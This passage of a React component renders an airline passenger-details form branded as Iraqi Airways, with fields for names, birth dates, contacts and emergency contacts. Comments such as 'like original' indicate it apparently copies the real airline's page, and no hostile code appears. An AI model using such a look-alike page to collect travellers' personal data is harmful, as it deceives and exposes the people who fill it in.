            </div>
          </div>
          {/* Separator */}
          <span className="mx-2 sm:mx-6 text-gray-300 text-lg sm:text-2xl">|</span>
          {/* Depart */}
          <div>
            <p className="text-[10px] sm:text-sm text-[#1B5E20]">Depart</p>
            <p className="text-xs sm:text-base font-bold text-[#1B5E20]">{flightData?.date ? new Date(flightData.date + 'T00:00:00').toLocaleDateString('en-GB', {weekday:'short', day:'numeric', month:'short'}) : ''}</p>
          </div>
          {/* Return - only for round trips */}
          {flightData?.tripType === 'round' && flightData?.legs?.length > 1 && (
            <>
              <span className="mx-2 sm:mx-6 text-gray-300 text-lg sm:text-2xl">|</span>
              <div>
                <p className="text-[10px] sm:text-sm text-[#1B5E20]">Return</p>
                <p className="text-xs sm:text-base font-bold text-[#1B5E20]">{flightData.legs[1].date ? new Date(flightData.legs[1].date + 'T00:00:00').toLocaleDateString('en-GB', {weekday:'short', day:'numeric', month:'short'}) : ''}</p>
              </div>
            </>
          )}
          {/* Separator */}
          <span className="mx-2 sm:mx-6 text-gray-300 text-lg sm:text-2xl">|</span>
          {/* Passenger */}
          <div>
            <p className="text-[10px] sm:text-sm text-[#1B5E20]">Passenger</p>
            <p className="text-xs sm:text-base font-bold text-[#1B5E20]">{totalCount} 👤</p>
          </div>
          {/* Your booking - right, square green box like original */}
          <div className="ml-auto bg-[#2E7D32] w-[60px] h-[50px] sm:w-[90px] sm:h-[70px] rounded flex flex-col items-center justify-center gap-0.5 sm:gap-1 text-white">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M2.25 3h1.386c.51 0 .955.343 1.087.835l.383 1.437M7.5 14.25a3 3 0 00-3 3h15.75m-12.75-3h11.218c1.121-2.3 2.1-4.684 2.924-7.138a60.114 60.114 0 00-16.536-1.84M7.5 14.25L5.106 5.272M6 20.25a.75.75 0 11-1.5 0 .75.75 0 011.5 0zm12.75 0a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"/></svg>
            <span className="font-bold text-[10px]">Your booking</span>
          </div>
        </div>
      </div>

      {/* Main content */}
      <main className="max-w-4xl mx-auto px-6 py-8">
        {/* Personal information */}
        <div className="border border-gray-200 rounded-lg p-8 mb-6">
          <h2 className="text-center text-[#2E7D32] text-2xl mb-6">Personal information</h2>
          <p className="text-[#2E7D32] text-sm mb-1">* = mandatory fields</p>
          <p className="text-gray-600 text-sm mb-6">Please fill personal information as shown in the passport</p>
          
          {passengers.map((p, index) => (
            <div key={index} className="space-y-5 mb-8">
              {passengers.length > 1 && <h3 className="text-[#2E7D32] font-bold text-lg">Passenger {index + 1} ({p.type})</h3>}
              {/* Title */}
              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                <legend className="text-[#2E7D32] text-xs px-1">Title*</legend>
                <select value={p.gender === 'Male' ? 'Mr' : 'Mrs'} onChange={(e) => update(index, 'gender', e.target.value === 'Mr' ? 'Male' : 'Female')} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]">
                  <option value="" disabled>Choose a title</option>
                  <option value="Mr">Mr</option>
                  <option value="Mrs">Mrs</option>
                  <option value="Ms">Ms</option>
                </select>
              </fieldset>
              {/* First name - English letters only */}
              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                <legend className="text-[#2E7D32] text-xs px-1">First name*</legend>
                <input type="text" placeholder="Enter a first name" value={p.firstName} onChange={(e) => { const v = e.target.value.replace(/[^a-zA-Z\s\-']/g, ''); update(index, 'firstName', v); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
              </fieldset>
              {/* Last name - English letters only */}
              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                <legend className="text-[#2E7D32] text-xs px-1">Last name*</legend>
                <input type="text" placeholder="Enter a last name" value={p.lastName} onChange={(e) => { const v = e.target.value.replace(/[^a-zA-Z\s\-']/g, ''); update(index, 'lastName', v); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
              </fieldset>
              {/* Date of birth - custom date picker */}
              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0] relative">
                <legend className="text-[#2E7D32] text-xs px-1">Date of birth</legend>
                <div className="flex items-center">
                  <input type="text" placeholder="Day / Month / Year" value={p.dob} onChange={(e) => { let v = e.target.value.replace(/[^0-9]/g, ''); if (v.length > 2) v = v.slice(0,2) + '/' + v.slice(2); if (v.length > 5) v = v.slice(0,5) + '/' + v.slice(5); if (v.length > 10) v = v.slice(0,10); update(index, 'dob', v); }} maxLength={10} className="flex-1 bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                  <svg data-cal-idx={index} onClick={() => { setCalPaxIdx(index); setCalView('years'); setCalYearRange(1991); setCalOpen(true); }} className="w-6 h-6 text-[#2E7D32] cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>
                </div>
              </fieldset>
              <p className="text-[#2E7D32] text-xs">Example: 31/01/2025</p>
            </div>
          ))}

          {/* Frequent flyer cards */}
          <h2 className="text-center text-[#2E7D32] text-2xl mt-8 mb-6">Frequent flyer cards</h2>
          <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0] mb-5">
            <legend className="text-[#2E7D32] text-xs px-1">Frequent flyer program</legend>
            <select className="w-full bg-transparent text-gray-400 focus:outline-none text-[15px]">
              <option value="">Select a program</option>
              <option value="iraqi">Iraqi Airways</option>
            </select>
          </fieldset>
          <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
            <legend className="text-[#2E7D32] text-xs px-1">Frequent flyer number</legend>
            <input type="text" placeholder="Enter a frequent flyer number" className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
          </fieldset>
        </div>

        {/* Contact Information */}
        <div className="border border-gray-200 rounded-lg p-8 mb-6">
          <h2 className="text-center text-[#2E7D32] text-2xl mb-6">Contact Information</h2>
          {/* Email */}
          <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0] mb-5">
            <legend className="text-[#2E7D32] text-xs px-1">Email*</legend>
            <input type="email" placeholder="Enter an email address" value={passengers[0]?.email || ''} onChange={(e) => { const v = e.target.value.replace(/[^a-zA-Z0-9@._\-+]/g, ''); update(0, 'email', v); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
          </fieldset>
          {/* Confirm email */}
          <fieldset className={`border rounded px-3 pt-1 pb-2 bg-[#f5faf0] mb-1 ${confirmEmail && confirmEmail !== (passengers[0]?.email || '') ? 'border-red-500' : 'border-[#4CAF50]'}`}>
            <legend className="text-[#2E7D32] text-xs px-1">Confirm email*</legend>
            <input type="email" placeholder="Confirm an email address" value={confirmEmail} onChange={(e) => { const v = e.target.value.replace(/[^a-zA-Z0-9@._\-+]/g, ''); setConfirmEmail(v); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
          </fieldset>
          {confirmEmail && confirmEmail !== (passengers[0]?.email || '') && (
            <p className="text-red-500 text-xs mb-5">Email addresses do not match</p>
          )}
          {/* Extra emails - each has Email + Confirm email + Remove button */}
          {extraEmails.map((em, i) => (
            <div key={`em-${i}`} className="mb-5 space-y-5">
              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                <legend className="text-[#2E7D32] text-xs px-1">Email</legend>
                <input type="email" placeholder="Enter an email address" value={em} onChange={(e) => { const arr = [...extraEmails]; arr[i] = e.target.value.replace(/[^a-zA-Z0-9@._\-+]/g, ''); setExtraEmails(arr); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
              </fieldset>
              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                <legend className="text-[#2E7D32] text-xs px-1">Confirm email</legend>
                <input type="email" placeholder="Confirm an email address" className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
              </fieldset>
            </div>
          ))}
          {/* Add another email */}
          <div className="text-center mb-4">
            <button type="button" onClick={() => setExtraEmails([...extraEmails, ''])} className="bg-[#2E7D32] text-white px-6 py-2.5 rounded-full text-sm font-medium">Add another email address</button>
          </div>
          {/* Remove additional email */}
          {extraEmails.length > 0 && (
            <div className="text-center mb-6">
              <button type="button" onClick={() => setExtraEmails(extraEmails.slice(0, -1))} className="bg-[#2E7D32] text-white px-6 py-2.5 rounded-full text-sm font-medium">Remove additional email address</button>
            </div>
          )}
          {/* Phone type */}
          <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0] mb-5">
            <legend className="text-[#2E7D32] text-xs px-1">Phone type*</legend>
            <select className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]">
              <option value="Personal">Personal</option>
              <option value="Business">Business</option>
              <option value="Agency">Agency</option>
              <option value="Other">Other</option>
            </select>
          </fieldset>
          {/* Country code + Phone number */}
          <div className="grid grid-cols-2 gap-4 mb-5">
            <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
              <legend className="text-[#2E7D32] text-xs px-1">Country calling code*</legend>
              <select value={passengers[0]?.dialCode || '+964'} onChange={(e) => update(0, 'dialCode', e.target.value)} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]">
                <option value="+964">Iraq (+964)</option>
                <option value="+93">Afghanistan (+93)</option>
                <option value="+355">Albania (+355)</option>
                <option value="+213">Algeria (+213)</option>
                <option value="+376">Andorra (+376)</option>
                <option value="+244">Angola (+244)</option>
                <option value="+54">Argentina (+54)</option>
                <option value="+374">Armenia (+374)</option>
                <option value="+61">Australia (+61)</option>
                <option value="+43">Austria (+43)</option>
                <option value="+994">Azerbaijan (+994)</option>
                <option value="+973">Bahrain (+973)</option>
                <option value="+880">Bangladesh (+880)</option>
                <option value="+375">Belarus (+375)</option>
                <option value="+32">Belgium (+32)</option>
                <option value="+55">Brazil (+55)</option>
                <option value="+359">Bulgaria (+359)</option>
                <option value="+1">Canada (+1)</option>
                <option value="+86">China (+86)</option>
                <option value="+57">Colombia (+57)</option>
                <option value="+385">Croatia (+385)</option>
                <option value="+357">Cyprus (+357)</option>
                <option value="+420">Czech Republic (+420)</option>
                <option value="+45">Denmark (+45)</option>
                <option value="+20">Egypt (+20)</option>
                <option value="+358">Finland (+358)</option>
                <option value="+33">France (+33)</option>
                <option value="+995">Georgia (+995)</option>
                <option value="+49">Germany (+49)</option>
                <option value="+30">Greece (+30)</option>
                <option value="+852">Hong Kong (+852)</option>
                <option value="+36">Hungary (+36)</option>
                <option value="+91">India (+91)</option>
                <option value="+62">Indonesia (+62)</option>
                <option value="+98">Iran (+98)</option>
                <option value="+353">Ireland (+353)</option>
                <option value="+39">Italy (+39)</option>
                <option value="+81">Japan (+81)</option>
                <option value="+962">Jordan (+962)</option>
                <option value="+7">Kazakhstan (+7)</option>
                <option value="+254">Kenya (+254)</option>
                <option value="+82">South Korea (+82)</option>
                <option value="+965">Kuwait (+965)</option>
                <option value="+961">Lebanon (+961)</option>
                <option value="+218">Libya (+218)</option>
                <option value="+60">Malaysia (+60)</option>
                <option value="+52">Mexico (+52)</option>
                <option value="+212">Morocco (+212)</option>
                <option value="+31">Netherlands (+31)</option>
                <option value="+64">New Zealand (+64)</option>
                <option value="+234">Nigeria (+234)</option>
                <option value="+47">Norway (+47)</option>
                <option value="+968">Oman (+968)</option>
                <option value="+92">Pakistan (+92)</option>
                <option value="+970">Palestine (+970)</option>
                <option value="+63">Philippines (+63)</option>
                <option value="+48">Poland (+48)</option>
                <option value="+351">Portugal (+351)</option>
                <option value="+974">Qatar (+974)</option>
                <option value="+40">Romania (+40)</option>
                <option value="+7">Russia (+7)</option>
                <option value="+966">Saudi Arabia (+966)</option>
                <option value="+381">Serbia (+381)</option>
                <option value="+65">Singapore (+65)</option>
                <option value="+27">South Africa (+27)</option>
                <option value="+34">Spain (+34)</option>
                <option value="+249">Sudan (+249)</option>
                <option value="+46">Sweden (+46)</option>
                <option value="+41">Switzerland (+41)</option>
                <option value="+963">Syria (+963)</option>
                <option value="+66">Thailand (+66)</option>
                <option value="+216">Tunisia (+216)</option>
                <option value="+90">Turkey (+90)</option>
                <option value="+971">UAE (+971)</option>
                <option value="+44">United Kingdom (+44)</option>
                <option value="+1">United States (+1)</option>
                <option value="+967">Yemen (+967)</option>
              </select>
            </fieldset>
            <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
              <legend className="text-[#2E7D32] text-xs px-1">Phone number*</legend>
              <input type="tel" placeholder="Enter a mobile phone" value={passengers[0]?.phone || ''} onChange={(e) => { const v = e.target.value.replace(/[^0-9]/g, ''); update(0, 'phone', v); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
            </fieldset>
          </div>
          {/* Extra phones - each has Phone type + Country code + Phone number */}
          {extraPhones.map((ph, i) => (
            <div key={`ph-${i}`} className="mb-5 space-y-5">
              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                <legend className="text-[#2E7D32] text-xs px-1">Phone type*</legend>
                <select className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]">
                  <option value="Personal">Personal</option>
                  <option value="Business">Business</option>
                  <option value="Agency">Agency</option>
                  <option value="Other">Other</option>
                </select>
              </fieldset>
              <div className="grid grid-cols-2 gap-4">
                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                  <legend className="text-[#2E7D32] text-xs px-1">Country calling code*</legend>
                  <select value={ph.code} onChange={(e) => { const arr = [...extraPhones]; arr[i] = {...arr[i], code: e.target.value}; setExtraPhones(arr); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]">
                    <option value="+964">Iraq (+964)</option><option value="+93">Afghanistan (+93)</option><option value="+355">Albania (+355)</option><option value="+213">Algeria (+213)</option><option value="+54">Argentina (+54)</option><option value="+374">Armenia (+374)</option><option value="+61">Australia (+61)</option><option value="+43">Austria (+43)</option><option value="+994">Azerbaijan (+994)</option><option value="+973">Bahrain (+973)</option><option value="+880">Bangladesh (+880)</option><option value="+32">Belgium (+32)</option><option value="+55">Brazil (+55)</option><option value="+1">Canada (+1)</option><option value="+86">China (+86)</option><option value="+45">Denmark (+45)</option><option value="+20">Egypt (+20)</option><option value="+33">France (+33)</option><option value="+49">Germany (+49)</option><option value="+91">India (+91)</option><option value="+98">Iran (+98)</option><option value="+39">Italy (+39)</option><option value="+81">Japan (+81)</option><option value="+962">Jordan (+962)</option><option value="+965">Kuwait (+965)</option><option value="+961">Lebanon (+961)</option><option value="+60">Malaysia (+60)</option><option value="+31">Netherlands (+31)</option><option value="+968">Oman (+968)</option><option value="+92">Pakistan (+92)</option><option value="+970">Palestine (+970)</option><option value="+974">Qatar (+974)</option><option value="+7">Russia (+7)</option><option value="+966">Saudi Arabia (+966)</option><option value="+34">Spain (+34)</option><option value="+963">Syria (+963)</option><option value="+90">Turkey (+90)</option><option value="+971">UAE (+971)</option><option value="+44">United Kingdom (+44)</option><option value="+1">United States (+1)</option><option value="+967">Yemen (+967)</option>
                  </select>
                </fieldset>
                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                  <legend className="text-[#2E7D32] text-xs px-1">Phone number*</legend>
                  <input type="tel" placeholder="Enter a mobile phone" value={ph.number} onChange={(e) => { const arr = [...extraPhones]; arr[i] = {...arr[i], number: e.target.value.replace(/[^0-9]/g, '')}; setExtraPhones(arr); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                </fieldset>
              </div>
            </div>
          ))}
          {/* Add another phone */}
          <div className="text-center mb-4">
            <button type="button" onClick={() => setExtraPhones([...extraPhones, {code: '+964', number: ''}])} className="bg-[#2E7D32] text-white px-6 py-2.5 rounded-full text-sm font-medium">Add another phone number</button>
          </div>
          {/* Remove additional phone */}
          {extraPhones.length > 0 && (
            <div className="text-center mb-6">
              <button type="button" onClick={() => setExtraPhones(extraPhones.slice(0, -1))} className="bg-[#2E7D32] text-white px-6 py-2.5 rounded-full text-sm font-medium">Remove additional phone number</button>
            </div>
          )}
          {/* Fill emergency contact toggle */}
          <div className="flex items-center gap-3 cursor-pointer" onClick={() => setShowEmergency(!showEmergency)}>
            <div className={`w-10 h-5 rounded-full relative transition-colors ${showEmergency ? 'bg-[#4CAF50]' : 'bg-gray-400'}`}><div className={`w-4 h-4 bg-white rounded-full absolute top-0.5 transition-all ${showEmergency ? 'left-[22px]' : 'left-0.5'}`}></div></div>
            <span className="text-gray-600 text-sm">Fill emergency contact</span>
          </div>
          {/* Emergency contact fields */}
          {showEmergency && (
            <div className="mt-5 space-y-5">
              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                <legend className="text-[#2E7D32] text-xs px-1">Emergency contact name*</legend>
                <input type="text" placeholder="Enter full name" value={emergency.firstName} onChange={(e) => { const v = e.target.value.replace(/[^a-zA-Z\s\-']/g, ''); setEmergency({...emergency, firstName: v}); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
              </fieldset>
              <div className="grid grid-cols-2 gap-4">
                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                  <legend className="text-[#2E7D32] text-xs px-1">Country calling code*</legend>
                  <select value={emergency.dialCode} onChange={(e) => setEmergency({...emergency, dialCode: e.target.value})} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]">
                    <option value="+964">Iraq (+964)</option><option value="+93">Afghanistan (+93)</option><option value="+355">Albania (+355)</option><option value="+213">Algeria (+213)</option><option value="+54">Argentina (+54)</option><option value="+374">Armenia (+374)</option><option value="+61">Australia (+61)</option><option value="+43">Austria (+43)</option><option value="+994">Azerbaijan (+994)</option><option value="+973">Bahrain (+973)</option><option value="+880">Bangladesh (+880)</option><option value="+32">Belgium (+32)</option><option value="+55">Brazil (+55)</option><option value="+1">Canada (+1)</option><option value="+86">China (+86)</option><option value="+45">Denmark (+45)</option><option value="+20">Egypt (+20)</option><option value="+33">France (+33)</option><option value="+49">Germany (+49)</option><option value="+91">India (+91)</option><option value="+98">Iran (+98)</option><option value="+39">Italy (+39)</option><option value="+81">Japan (+81)</option><option value="+962">Jordan (+962)</option><option value="+965">Kuwait (+965)</option><option value="+961">Lebanon (+961)</option><option value="+60">Malaysia (+60)</option><option value="+31">Netherlands (+31)</option><option value="+968">Oman (+968)</option><option value="+92">Pakistan (+92)</option><option value="+970">Palestine (+970)</option><option value="+974">Qatar (+974)</option><option value="+7">Russia (+7)</option><option value="+966">Saudi Arabia (+966)</option><option value="+34">Spain (+34)</option><option value="+963">Syria (+963)</option><option value="+90">Turkey (+90)</option><option value="+971">UAE (+971)</option><option value="+44">United Kingdom (+44)</option><option value="+1">United States (+1)</option><option value="+967">Yemen (+967)</option>
                  </select>
                </fieldset>
                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                  <legend className="text-[#2E7D32] text-xs px-1">Phone number*</legend>
                  <input type="tel" placeholder="Enter a mobile phone" value={emergency.phone} onChange={(e) => { const v = e.target.value.replace(/[^0-9]/g, ''); setEmergency({...emergency, phone: v}); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                </fieldset>
              </div>
            </div>
          )}
        </div>

        {/* Remember passenger information */}
        <div className="border border-gray-200 rounded-lg p-6 mb-6 bg-[#f9f9f9]">
          <div className="flex items-center gap-3 cursor-pointer" onClick={() => setRememberPassenger(!rememberPassenger)}>
            <div className={`w-10 h-5 rounded-full relative transition-colors ${rememberPassenger ? 'bg-[#4CAF50]' : 'bg-gray-400'}`}><div className={`w-4 h-4 bg-white rounded-full absolute top-0.5 transition-all ${rememberPassenger ? 'left-[22px]' : 'left-0.5'}`}></div></div>
            <div>
              <p className="font-bold text-gray-800">Remember passenger information</p>
              <p className="text-gray-500 text-sm">Save your personal information now, save time in future bookings.</p>
            </div>
          </div>
        </div>

        {/* Privacy policy checkbox */}
        <div className="border border-gray-200 rounded-lg p-6 mb-8">
          <label className="flex items-start gap-3 cursor-pointer">
            <input type="checkbox" checked={privacyAccepted} onChange={(e) => setPrivacyAccepted(e.target.checked)} className="w-5 h-5 mt-0.5 rounded accent-[#4CAF50]" style={{accentColor: '#4CAF50'}} />
            <span className="text-gray-700 text-sm">I understand and accept that my personal data will be processed in accordance with the applicable carrier's privacy policy <a href="#" className="text-[#2E7D32] underline">more</a></span>
          </label>
        </div>

        {/* Error message */}
        {formError && (
          <div className="bg-red-50 border border-red-400 text-red-700 px-4 py-3 rounded mb-4 text-sm">
            {formError}
          </div>
        )}

        {/* Back + Confirm buttons - right aligned */}
        <div className="flex justify-end gap-3 mb-12">
          <button onClick={() => setLocation('/flight-search')} className="bg-[#4CAF50] text-white px-8 py-3 rounded-full text-base font-medium hover:bg-[#388E3C]">Back</button>
          <button onClick={handleContinue} className="bg-[#1B5E20] text-white px-8 py-3 rounded-full text-base font-medium hover:bg-[#0D3B0F]">Confirm</button>
        </div>
      </main>

      {/* Footer - same as flight search */}
      <footer className="bg-[#4ca42c] text-white" dir="ltr">
        <div className="max-w-6xl mx-auto px-6 py-10">
          <div className="flex justify-between mb-8">
            <div><h4 className="font-bold text-lg mb-2">Plan and booking</h4><a href="/" className="text-white underline text-sm">Book trip ↗</a></div>
            <div><h4 className="font-bold text-lg mb-2">Contact us</h4><a href="/" className="text-white underline text-sm block">Contact us ↗</a><a href="/" className="text-white underline text-sm block mt-1">Iraqi airways offers ↗</a></div>
            <div><h4 className="font-bold text-lg mb-2">About us</h4><a href="/" className="text-white underline text-sm">Our fleet ↗</a></div>
          </div>
          <div className="text-center">
            <h4 className="font-bold text-lg mb-3">Secured payment</h4>
            <div className="flex justify-center gap-3 mb-2">
              <div className="bg-white rounded overflow-hidden"><img src="/iraqi_airways/americanexpress.png" alt="Amex" className="h-10" /></div>
              <div className="bg-white rounded overflow-hidden"><img src="/iraqi_airways/visa.png" alt="Visa" className="h-10" /></div>
              <div className="bg-white rounded overflow-hidden"><img src="/iraqi_airways/mastercard.png" alt="MC" className="h-10" /></div>
              <div className="bg-white rounded overflow-hidden"><img src="/iraqi_airways/paypal.png" alt="PayPal" className="h-10" /></div>
              <div className="bg-white rounded overflow-hidden"><img src="/iraqi_airways/dinersclub.png" alt="DC" className="h-10" /></div>
            </div>
            <p className="text-sm text-white/80">Credit card fees may occur.</p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default PassengerDetails;
